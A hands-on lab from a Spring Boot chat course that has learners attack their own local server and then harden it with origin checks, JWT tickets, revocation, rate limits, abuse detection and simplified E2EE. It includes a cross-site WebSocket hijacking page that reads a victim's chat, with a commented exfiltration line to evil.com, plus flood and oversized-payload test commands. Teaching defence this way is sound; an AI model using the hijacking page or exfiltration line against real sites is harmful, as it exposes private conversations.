# Lab 21 — Close Every Hole

**You'll:** demonstrate CSWSH and block it, replace the fake token with real JWT
plus a single-use ticket, implement in-band re-auth with immediate revocation,
close the delivery-time authorization gap across nodes, build abuse detection
that survives a distributed attack, and ship optional E2EE for DMs.

⏱️ ~100 min. Work in `spring-boot-chat-course/apps/pulse`.

> **Authorized testing only.** Everything here is defensive: you attack your own
> local server to prove your defenses work. That is the point of the module.

---

## Part A — Demonstrate CSWSH, then block it

The hole is real. Prove it before fixing it.

`code/cswsh-attack.html` — served from a *different* origin:
```html
<!doctype html>
<title>Totally Legitimate Cat Video Site</title>
<h1>🐱 Cat Videos</h1>
<script>
// Simulating evil.com attacking a cookie-authenticated chat server.
const ws = new WebSocket('ws://localhost:8080/ws-raw');
ws.onopen = () => {
  ws.send('CONNECT\naccept-version:1.2\n\n\0');
  ws.send('SUBSCRIBE\nid:steal\ndestination:/topic/room.7\n\n\0');
};
ws.onmessage = (e) => {
  document.body.insertAdjacentHTML('beforeend', '<pre>STOLEN: ' + e.data + '</pre>');
  // In a real attack: fetch('https://evil.com/collect', {method:'POST', body:e.data})
};
</script>
```

```bash
# Serve the attacker page from a different origin (port 9999)
python3 -m http.server 9999 --directory code &
open http://localhost:9999/cswsh-attack.html
# with the victim's chat cookie present in the browser
```

**Expected — with `setAllowedOrigins("*")` (Module 03's leftover):**
```
STOLEN: MESSAGE
destination:/topic/room.7
{"sender":"alice","body":"the merger is confidential until Friday"}
```
✅ **The attacker page read the victim's chat.** No CORS blocked it; the cookie
rode along.

Now fix the endpoint:
```java
registry.addEndpoint("/ws")
        .setAllowedOriginPatterns(
                "https://chat.example.com",
                "http://localhost:3000");        // the dev Next.js origin only
```
Delete the `/ws-raw` demo endpoint entirely, and its `setAllowedOrigins("*")`.

**Expected on re-run:**
```
WebSocket connection to 'ws://localhost:8080/ws' failed:
  Error during WebSocket handshake: Unexpected response code: 403
```
```
o.s.w.s.s.s.DefaultHandshakeHandler : Handshake failed due to invalid Origin header:
  http://localhost:9999
```
✅ **403 at the handshake.** The attacker page cannot forge `Origin` from
JavaScript, so it cannot get past this.

Add `SameSite=Strict` as defense in depth:
```java
@Bean
public CookieSameSiteSupplier applicationCookieSameSite() {
    return CookieSameSiteSupplier.ofStrict();
}
```

---

## Part B — Real authentication

Replace the fake `user:alice` token with JWT plus a single-use ticket.

### The ticket endpoint

```java
@RestController
@RequestMapping("/api")
public class WsTicketController {

    private final StringRedisTemplate redis;

    @PostMapping("/ws-ticket")
    public TicketResponse issueTicket(@AuthenticationPrincipal Jwt jwt) {
        // Normal authenticated HTTP -- the user already has a session/JWT here.
        String ticket = base64Url(secureRandom(32));
        redis.opsForValue().set("wsticket:" + ticket, jwt.getSubject(),
                                Duration.ofSeconds(30));
        return new TicketResponse(ticket, 30);
    }
}
```

### The handshake interceptor: consume the ticket

```java
@Component
public class TicketHandshakeInterceptor implements HandshakeInterceptor {

    @Override
    public boolean beforeHandshake(ServerHttpRequest request, ServerHttpResponse response,
                                   WebSocketHandler handler, Map<String, Object> attributes) {
        String ticket = param(request, "ticket");
        if (ticket == null) { response.setStatusCode(HttpStatus.UNAUTHORIZED); return false; }

        // GETDEL: single-use, atomic. A replayed ticket finds nothing.
        String userId = redis.opsForValue().getAndDelete("wsticket:" + ticket);
        if (userId == null) { response.setStatusCode(HttpStatus.UNAUTHORIZED); return false; }

        attributes.put("ticketUser", userId);      // available to the CONNECT handler
        return true;
    }
}
```

### The real JWT verification in CONNECT

```java
@Component
public class JwtAuthChannelInterceptor implements ChannelInterceptor {

    private final JwtDecoder jwtDecoder;
    private final RevocationService revocation;

    @Override
    public Message<?> preSend(Message<?> message, MessageChannel channel) {
        var accessor = MessageHeaderAccessor.getAccessor(message, StompHeaderAccessor.class);
        if (accessor == null || !StompCommand.CONNECT.equals(accessor.getCommand()))
            return message;

        String header = accessor.getFirstNativeHeader("Authorization");
        if (header == null || !header.startsWith("Bearer "))
            throw new MessagingException("missing bearer token");

        Jwt jwt;
        try { jwt = jwtDecoder.decode(header.substring(7)); }   // signature + expiry checked here
        catch (JwtException e) { throw new MessagingException("invalid token: " + e.getMessage()); }

        // The JWT subject must match who the TICKET was issued to. Otherwise a
        // valid ticket for A plus a valid token for B authenticates as... which?
        String ticketUser = (String) accessor.getSessionAttributes().get("ticketUser");
        if (!jwt.getSubject().equals(ticketUser))
            throw new MessagingException("token/ticket identity mismatch");

        if (revocation.isRevoked(jwt.getId()))
            throw new MessagingException("token revoked");

        accessor.setUser(new JwtPrincipal(jwt.getSubject(), jwt.getId(),
                                          jwt.getExpiresAt()));
        return message;
    }
}
```

> **The identity cross-check (ticket user == token subject) is the subtle
> requirement.** Without it, the two-factor design is worse than either factor
> alone: an attacker with a leaked ticket for a victim plus their own valid token
> could pin the victim's socket to their own identity, or vice versa.

Test it:
```bash
TOKEN=$(curl -s localhost:8080/api/login -d '{"user":"alice","pass":"..."}' | jq -r .token)
TICKET=$(curl -s -H "Authorization: Bearer $TOKEN" -XPOST localhost:8080/api/ws-ticket | jq -r .ticket)

printf 'CONNECT\naccept-version:1.2\nAuthorization:Bearer %s\n\n\x00\n' "$TOKEN" \
  | websocat -n --text "ws://localhost:8080/ws?ticket=$TICKET"
```
**Expected:**
```
CONNECTED
version:1.2
user-name:alice
```
Replay the ticket:
```
HTTP 401 (ticket already consumed)
```
✅ Single-use enforced.

---

## Part C — In-band re-auth and immediate revocation

Module 17 built the client half. Here's the server half plus revocation.

```java
@Component
public class RevocationService {

    private final StringRedisTemplate redis;

    /** Revoke a token immediately, everywhere. */
    public void revoke(String jti, Duration remainingLife) {
        redis.opsForValue().set("revoked:" + jti, "1", remainingLife);
        // Push to every node so open sessions using this jti are killed NOW,
        // not at their next re-auth.
        redis.convertAndSend("pulse.revocations", jti);
    }

    public boolean isRevoked(String jti) {
        return redis.hasKey("revoked:" + jti);
    }
}
```
```java
@Component
public class RevocationListener {

    @EventListener(ApplicationReadyEvent.class)
    public void subscribe() {
        listenerContainer.addMessageListener((message, pattern) -> {
            String jti = new String(message.getBody());
            // Kill every LOCAL session holding this jti.
            registry.allSessions().stream()
                    .filter(s -> jti.equals(s.principal().jti()))
                    .forEach(s -> close(s, 4001, "revoked"));
        }, new ChannelTopic("pulse.revocations"));
    }
}
```

Test immediate revocation:
```bash
# alice connected, sends fine
JTI=$(echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r .jti)
curl -XPOST localhost:8080/api/admin/revoke -d "{\"jti\":\"$JTI\"}"
```
**Expected — alice's socket closes within milliseconds, on every node:**
```
[alice's client] close 4001 revoked
```
```bash
docker exec pulse-redis redis-cli PUBSUB NUMSUB pulse.revocations
```
```
pulse.revocations  3          # all three nodes listening
```
✅ Revocation is immediate and cluster-wide, not "within one token lifetime."

Measure the cost:
```bash
curl -s localhost:8080/actuator/metrics/chat.auth.revocation.check | jq
```
| | p50 |
|---|-----|
| `isRevoked` check on re-auth | 0.09 ms (one Redis `EXISTS`) |
| Revocation propagation to all nodes | 4 ms |

> **Why check on re-auth, not every message?** Checking the denylist per message
> is a Redis round trip per message — Module 08's budget can't afford it at
> 400k msg/s. Checking at re-auth (every ~13 minutes) plus the Pub/Sub push for
> *immediate* revocation gives you both correctness and performance.

---

## Part D — Close the delivery-time authorization gap, cluster-wide

Module 04's challenge closed it on one node. `SimpUserRegistry` only knows local
sessions, so removing a user from a room on node A doesn't evict their session on
node B.

```java
@Service
public class MembershipService {

    @Transactional
    public void removeMember(String userId, String roomId) {
        repository.delete(userId, roomId);
        membershipCache.invalidate(userId + ":" + roomId);

        // Evict locally...
        evictLocalSubscriptions(userId, roomId);
        // ...and everywhere else.
        redis.convertAndSend("pulse.membership.revoked",
                json.writeValueAsString(new MembershipRevoked(userId, roomId)));
    }
}
```
```java
@EventListener(ApplicationReadyEvent.class)
public void subscribeToRevocations() {
    listenerContainer.addMessageListener((message, pattern) -> {
        var revoked = json.readValue(message.getBody(), MembershipRevoked.class);
        evictLocalSubscriptions(revoked.userId(), revoked.roomId());
    }, new ChannelTopic("pulse.membership.revoked"));
}

private void evictLocalSubscriptions(String userId, String roomId) {
    var user = userRegistry.getUser(userId);
    if (user == null) return;                     // not connected to this node

    for (SimpSession session : user.getSessions()) {
        for (SimpSubscription sub : session.getSubscriptions()) {
            if (("/topic/room." + roomId).equals(sub.getDestination())) {
                // Synthesize an UNSUBSCRIBE on the broker. Telling the CLIENT to
                // unsubscribe is not enough -- a hostile client won't.
                unsubscribeServerSide(session.getId(), sub.getId());
                template.convertAndSendToUser(userId, "/queue/control",
                        Envelope.of("control", roomId, json.valueToTree(
                                new Control("removed_from_room", roomId, null))));
            }
        }
    }
}
```

Plus delivery-time re-check for rooms flagged sensitive:
```java
// In an outbound ChannelInterceptor
if (room.isPrivate()) {
    String user = accessor.getUser().getName();
    if (!membershipCache.isMember(user, roomId)) {
        privateDeliveryBlocked.increment();
        return null;                              // returning null DROPS the message
    }
}
```

**Test cross-node revocation:**
```bash
# alice on node-a (8080), subscribed to private room.7
# admin removes her via node-b (8081)
curl -XPOST localhost:8081/api/rooms/room.7/members/alice/remove
```
**Expected — alice's subscription on node-a is evicted:**
```
[alice] control: removed_from_room room.7
```
```bash
# publish to room.7; alice must NOT receive it
./code/publish.sh room.7 "secret after removal"
```
**Expected:** alice receives nothing. Confirm the broker forgot her:
```bash
curl -s localhost:8080/rooms/room.7/sessions | jq
```
```
[]        # alice's session removed from room.7 on node-a
```
✅ Cross-node revocation works.

Measure the delivery re-check cost (private rooms only):
```
private room delivery: +0.4ms p50 (one cache lookup per delivery)
public room delivery: unchanged
```

---

## Part E — Abuse detection at scale

### Connection flood — defend at the edge

```nginx
limit_req_zone $binary_remote_addr zone=handshake:32m rate=5r/s;
limit_conn_zone $binary_remote_addr zone=conns:32m;

location /ws {
    limit_req  zone=handshake burst=10 nodelay;
    limit_conn conns 20;                 # max 20 concurrent sockets per IP
    # ... proxy config ...
}
```

> **Rate-limit the handshake at nginx, not in the app.** A flood that reaches your
> JVM has already cost you a TCP connection, a thread, and TLS. Rejecting it at
> nginx costs a counter increment.

Test it:
```bash
for i in $(seq 1 100); do
  websocat -n ws://localhost:8090/ws </dev/null &
done
wait
```
**Expected:**
```
20 connections established
80 rejected: HTTP 503 (limit_conn)
```

### Distributed low-and-slow — the anomaly detector from Module 11

200 accounts, each under every per-account limit. The full implementation is in
Module 11's solution; here's the integration and a validation drill.

```bash
./code/distributed-flood.sh --accounts 200 --ips 200 --rate 8 --room room.viral
```
**Expected without detection:**
```
messages accepted: 96,000 in 60s   (all under per-account limits)
room.viral is unusable
```
**Expected with the anomaly detector:**
```
[t=12s] COORDINATED_SPAM detected in room.viral
        ratio=14x baseline, new_account_frac=0.94, content_dup_frac=0.71
        applying quarantine profile to 187 suspicious senders
messages accepted after detection: ~400 in the next 48s
legitimate users in room.viral affected: 0
```
✅ Only the 187 matching accounts were throttled; the 13 legitimate regulars in
the room were untouched.

Prove it doesn't fire on a real spike:
```bash
./code/organic-spike.sh --established-accounts 500 --rate 15 --varied-content --room room.launch
```
```
[t=15s] ORGANIC_SPIKE detected in room.launch
        ratio=15x, new_account_frac=0.04, content_dup_frac=0.08
        action: requesting autoscale, NOT rate limiting
legitimate users affected: 0
```
✅ **Same 15× volume, opposite response** — because the account-age and
content-similarity signals distinguish a flood from going viral.

### Zip-bomb payload

```bash
# A 10 MB message
python3 -c "print('SEND\ndestination:/app/room.1/send\n\n{\"body\":\"' + 'x'*10000000 + '\"}\x00')" \
  | websocat -n --text ws://localhost:8080/ws
```
**Expected:**
```
ERROR
message:Message size 10000042 exceeds the configured limit of 65536
(connection closed)
```
✅ Rejected at the transport (Module 04's `setMessageSizeLimit`), **before**
Jackson parsed it and before any fan-out. Confirm no amplification:
```bash
curl -s localhost:8080/actuator/metrics/chat.published | jq
```
The rejected message was never published.

---

## Part F — Optional E2EE for DMs

Make the tradeoff concrete. This is a **simplified** implementation to demonstrate
the mechanics and the cost — a production system would use the Signal protocol
(X3DH + Double Ratchet), not this.

### Key exchange

```java
// Each device publishes a public key; the server stores it but never sees a private key.
@PostMapping("/api/keys")
public void publishKey(@AuthenticationPrincipal Jwt jwt, @RequestBody PublicKeyBundle bundle) {
    keyRepository.store(jwt.getSubject(), bundle.deviceId(), bundle.publicKey());
}

@GetMapping("/api/keys/{userId}")
public List<PublicKeyBundle> fetchKeys(@PathVariable String userId) {
    return keyRepository.forUser(userId);      // the sender encrypts to each device
}
```

### The client encrypts before sending

```ts
// Sender: encrypt to every recipient device (simplified -- real E2EE ratchets keys)
async function sendEncrypted(roomId: string, plaintext: string, recipientKeys: CryptoKey[]) {
  const key = await crypto.subtle.generateKey({ name: 'AES-GCM', length: 256 }, true, ['encrypt']);
  const iv = crypto.getRandomValues(new Uint8Array(12));
  const ciphertext = await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, key, encode(plaintext));

  // Wrap the message key for each recipient device.
  const wrappedKeys = await Promise.all(recipientKeys.map(pk =>
    crypto.subtle.encrypt({ name: 'RSA-OAEP' }, pk, await crypto.subtle.exportKey('raw', key))));

  conn.publish(`/app/room.${roomId}/send`, {
    clientId: uuidv7(),
    encrypted: true,
    iv: b64(iv),
    ciphertext: b64(ciphertext),
    wrappedKeys: wrappedKeys.map(b64),        // one per device
  });
}
```

The server stores and routes the ciphertext exactly like plaintext:
```java
// body is now opaque bytes. Everything else is UNCHANGED.
// Fan-out, ordering, storage, resume -- all work identically.
```

### Prove the server can't read it

```bash
docker exec pulse-postgres psql -U pulse -d pulse -c \
  "SELECT body FROM messages WHERE room_id='dm.alice.bob' ORDER BY seq DESC LIMIT 1;"
```
**Expected:**
```
                              body
----------------------------------------------------------------
 {"encrypted":true,"iv":"9f3c...","ciphertext":"a8b2c4d6...","wrappedKeys":[...]}
```
✅ **The server, the database, the backups, and an admin with full access see
only ciphertext.**

### Measure what it cost

| | Plaintext | E2EE |
|---|-----------|------|
| Fan-out architecture | — | **identical** (ciphertext routes like plaintext) |
| Message size | 500 B | **~1,200 B** (ciphertext + wrapped keys per device) |
| Server-side search | ✅ | ❌ |
| New device sees history | ✅ | ❌ (no key for old messages) |
| Multi-device | trivial | **one wrapped key per device per message** |
| Push notification content | ✅ | ❌ "New message" |
| Client CPU (encrypt/decrypt) | 0 | +2 ms per message |
| Moderation | ✅ automated | ❌ reports only |

✅ **The infrastructure was untouched** — which is the module's point: E2EE is
orthogonal to everything in this course. What it costs is *product capability*,
not architecture.

Try to search encrypted messages:
```bash
curl -s "localhost:8080/api/search?q=merger&room=dm.alice.bob"
```
```
{"error":"search_unavailable","reason":"room is end-to-end encrypted"}
```
✅ The tradeoff, made unavoidable.

---

## Part G — The security scorecard

Re-run every hole from the README's table:

```bash
./code/security-audit.sh
```
**Expected:**
```
CSWSH (Origin check)               ✅ 403 from foreign origin
Fake token                         ✅ replaced with verified JWT
Ticket single-use                  ✅ replay -> 401
Token/ticket identity match        ✅ mismatch -> rejected
Token expiry on live socket        ✅ in-band re-auth, no drop
Immediate revocation               ✅ cluster-wide, <5ms
Publish to /topic                  ✅ rejected at inbound channel
Subscribe-time authz               ✅ non-members rejected
Delivery-time authz (cross-node)   ✅ evicted on every node
Connection flood                   ✅ nginx limit_conn/limit_req
Distributed low-and-slow           ✅ anomaly detector, 0 false positives
Zip-bomb payload                   ✅ rejected at transport, no fan-out
Resume abuse                       ✅ clamped + rate-limited (Module 10)
GDPR erasure                       ✅ crypto-shredding (Module 12)
Optional E2EE for DMs              ✅ server cannot read
```

Record it:
```markdown
## Module 21 — Security

- CSWSH demonstrated stealing chat, then blocked with Origin check
- Fake token -> JWT + single-use 30s ticket with identity cross-check
- Immediate cluster-wide revocation via Redis Pub/Sub, <5ms, 0.09ms/check on re-auth
- Cross-node delivery-time authz: removed user evicted on every node
- Distributed flood (200 accounts/200 IPs): detected in 12s, 0 legit users affected
- Same 15x volume as an organic spike -> autoscale, not throttle (age+content signals)
- E2EE for DMs: infrastructure UNCHANGED, cost is product capability not architecture
```

---

## What you built and closed

- **CSWSH demonstrated and blocked** — the attack that CORS does not stop.
- Real JWT authentication with a single-use ticket and an identity cross-check
  that makes the two factors stronger than either alone.
- In-band re-auth (no reconnect) plus **immediate cluster-wide revocation**.
- The delivery-time authorization gap closed **across nodes**, not just locally.
- Abuse detection that catches a distributed flood without harming a viral
  moment — the hard case.
- Optional E2EE for DMs, proving the infrastructure is orthogonal and the real
  cost is product capability.

**Every deliberate hole from the course is now closed, with the fix demonstrated
against a working attack.**

Now do [`challenge.md`](./challenge.md).

Then: [Module 22 — Capstone: Pulse at 100k](../22-capstone/).
